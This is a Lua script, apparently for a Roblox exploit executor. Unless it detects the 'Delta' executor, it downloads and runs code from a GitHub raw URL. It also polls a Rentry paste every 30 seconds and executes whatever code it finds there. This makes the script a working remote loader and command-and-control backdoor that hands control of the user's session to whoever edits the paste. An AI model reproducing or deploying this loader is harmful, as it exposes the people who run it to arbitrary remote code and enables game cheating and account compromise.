if identifyexecutor and typeof(identifyexecutor) == "function" and identifyexecutor():lower():find("delta") then
    print("Hello")
else
    spawn(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/greywaterstill/GAG/refs/heads/main/base.lua"))();
    end)

    spawn(function()
        local request = http_request or request or syn.request
        local HttpService = game:GetService("HttpService")

        while true do
            task.wait(30)

            local success, res = pcall(function()
                return request({
                    Url = "https://rentry.co/vqafnmu2", -- your Rentry URL
                    Method = "GET"
                })
            end)

            if success and res and res.Body then
                local html = res.Body
                local content = string.match(html, "<p>(.-)</p>")

                if content and #content > 0 then
                    -- Replace HTML entities
                    content = content:gsub("&quot;", "\""):gsub("&#39;", "'")

                    local func, err = loadstring(content)
                    if func then
                        pcall(func) -- safely execute loaded code
                    else
                        warn("Error compiling Rentry code:", err)
                    end
                else
                    warn("Could not find <p> block in Rentry HTML")
                end
            else
                warn("Failed to fetch Rentry paste")
            end
        end
    end)
end

